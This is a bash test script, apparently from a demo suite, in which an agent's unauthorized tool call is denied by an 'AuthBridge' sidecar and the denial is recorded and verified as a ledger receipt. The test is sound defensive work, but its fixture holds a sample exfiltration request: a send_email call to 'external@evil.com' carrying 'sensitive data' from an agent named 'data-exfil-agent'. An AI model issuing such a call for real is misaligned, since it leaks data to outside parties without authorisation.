#!/bin/bash
# Scenario 06: AuthBridge denies tool access → denial receipt issued
# Agent tries to call a tool not on the allowlist. AuthBridge blocks
# the request and records the denial in the ledger.
set -e
source "$(dirname "$0")/_lib.sh"

echo ""
echo -e "${BOLD}Scenario 06: AuthBridge tool access denied + receipt${RESET}"
echo -e "${DIM}Agent calls unauthorized tool → AuthBridge denies → receipt records denial${RESET}"
echo ""

SESSION="session-06-$$"
AGENT_SPIFFE="spiffe://rossoctl.io/ns/default/sa/data-exfil-agent"
REQUEST_BODY='{"method":"tools/call","params":{"name":"send_email","arguments":{"to":"external@evil.com","body":"sensitive data"}}}'
INPUT_HASH=$(sha256 "$REQUEST_BODY")

# AuthBridge denies the tool call (not on allowlist)
RECEIPT=$(issue_receipt \
    "authbridge.tool.denied" \
    "$AGENT_SPIFFE" \
    "{\"tool\":\"send_email\",\"reason\":\"tool not in allowlist\",\"destination\":\"smtp.external.com\",\"policy\":\"host-allowlist-v1\"}" \
    "authbridge-sidecar" \
    "$SESSION" \
    "$INPUT_HASH")

HASH=$(echo "$RECEIPT" | python3 -c "import json,sys; print(json.load(sys.stdin)['entry_hash'])")
echo "$RECEIPT" | python3 -m json.tool

if [ -n "$HASH" ]; then
    ok "Denial receipt issued: hash=${HASH:0:16}..."
else
    fail "No receipt hash returned"
    exit 1
fi

# Verify the denial receipt
echo ""
VERIFY=$(verify_receipt "$HASH" "authbridge.tool.denied")
VALID=$(echo "$VERIFY" | python3 -c "import json,sys; print(json.load(sys.stdin)['valid'])")
INPUT=$(echo "$VERIFY" | python3 -c "import json,sys; print(json.load(sys.stdin).get('input_hash',''))")

if [ "$VALID" = "True" ]; then
    ok "Denial receipt verified: valid=true"
    if [ -n "$INPUT" ] && [ "$INPUT" != "None" ]; then
        ok "input_hash recorded: ${INPUT:0:16}..."
    fi
else
    fail "Receipt verification failed"
    echo "$VERIFY" | python3 -m json.tool
    exit 1
fi

echo ""
ok "Scenario 06 complete"
